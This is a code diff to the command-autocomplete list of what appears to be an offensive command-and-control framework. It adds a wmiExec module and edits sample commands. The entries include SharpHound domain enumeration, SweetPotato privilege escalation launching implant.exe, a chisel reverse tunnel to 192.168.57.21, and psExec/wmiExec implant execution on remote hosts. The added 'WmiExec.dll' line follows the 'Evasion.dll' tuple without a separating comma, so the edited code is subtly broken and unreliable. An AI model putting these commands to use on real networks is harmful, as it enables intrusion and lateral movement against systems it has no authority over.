@@ -293,7 +293,7 @@ completerData = [
                                 ('-group=user',[]),
                             ]),
                             ('SharpHound.exe -c All -d dev.admin.offshore.com',  []),
-                            ('SweetPotato.exe -e EfsRpc -p C:\Users\Public\Documents\implant.exe"',  []),
+                            ('SweetPotato.exe -e EfsRpc -p C:\\Users\\Public\\Documents\\implant.exe',  []),
                         ]),
                     ]),
     ('upload',[]),
@@ -395,7 +395,8 @@ completerData = [
              ('kerberosUseTicket',  []),
              ('chisel',  []),
              ('evasion',  []),
-             ('spawnAs',  [])
+             ('spawnAs',  []),
+             ('wmiExec',  []),
              ]),
     ('kerberosUseTicket',[]),
     ('powershell',[
@@ -418,7 +419,10 @@ completerData = [
                 ('chisel.exe client 192.168.57.21:9001 R:445:192.168.57.14:445',  []),
                 ]),
     ('psExec',[
-        ('implant.exe 10.10.10.10',  []),
+        ('10.10.10.10 implant.exe',  []),
+    ]),
+    ('wmiExec',[
+        ('10.10.10.10 implant.exe',  []),
     ]),
     ('spawnAs',[
         ('user password implant.exe',  []),
@@ -451,6 +455,7 @@ completerData = [
              ('Cat.dll',  []),
              ('Tree.dll',  []),
              ('Evasion.dll',  [])
+             ('WmiExec.dll',  [])
              ]),
 ]
 
